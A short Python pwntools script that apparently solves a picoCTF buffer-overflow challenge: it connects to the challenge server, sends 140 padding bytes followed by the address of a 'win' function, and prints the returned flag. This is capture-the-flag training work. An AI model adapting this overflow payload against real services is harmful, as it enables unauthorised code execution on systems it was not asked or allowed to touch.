#!/usr/bin/python3

from pwn import *
import os

os.system("clear")

io = remote("saturn.picoctf.net", 59394)

win_addr = 0x00401530

payload = b""
payload += b"A" * 140
payload += p32(win_addr)

io.recv()
io.recv()

io.sendline(payload)

print(io.recvuntil(b'}'))
